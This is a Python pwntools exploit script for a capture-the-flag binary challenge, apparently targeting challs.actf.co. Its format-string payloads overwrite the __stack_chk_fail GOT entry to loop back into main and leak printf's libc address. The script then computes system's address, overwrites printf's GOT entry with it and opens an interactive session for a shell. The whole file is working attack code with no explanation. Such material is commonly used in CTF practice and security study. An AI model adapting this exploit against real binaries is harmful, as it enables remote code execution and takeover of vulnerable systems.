from pwn import *
from pwn import fmtstr_payload



libc = ELF("./libc.so.6")
if args.REMOTE:
    context.binary = file = ELF("./og")
else:
    context.binary = file = ELF("./patched")
context.terminal = ["kitty"]
gdbscript="""
set debuginfod enabled off
c
"""

if args.REMOTE:
    p = remote("challs.actf.co", "31312")
else:
    p = gdb.debug("./patched", gdbscript=gdbscript)

main = file.sym.main

payload = b""
payload += f"%{main & 0xffff}c".encode()
payload += f"%{10}$hn".encode()
payload = payload.ljust(0x20, b"\x00")
payload += p64(file.got.__stack_chk_fail)
p.sendline(payload)

payload = b""
payload += b"%10$s"
payload = payload.ljust(0x20, b"\x00")
payload += p64(file.got.printf)
p.sendline(payload)

p.recvuntil(b"See you around, ")
p.recvuntil(b"See you around, ")
leak = p.recv(6)
printf = u64(leak.ljust(8, b"\x00"))
log.info(f"{printf = :#x}")

libcbase = printf - libc.sym.printf
log.info(f"{libcbase = :#x}")

system = libcbase + libc.sym.system
log.info(f"{system = :#x}")
log.info(f"{printf = :#x}")

payload = f"%{system & 0xffff}c".encode()
payload += f"%{10}$hn".encode()
payload += f"%{256 - (system & 0xff) + (system >> 16 & 0xff)}c".encode()
payload += f"%{11}$hhn".encode()
assert len(payload) <= 0x20
payload = payload.ljust(0x20, b"\x00")
payload += p64(file.got.printf)
payload += p64(file.got.printf + 2)
p.sendline(payload)

p.interactive()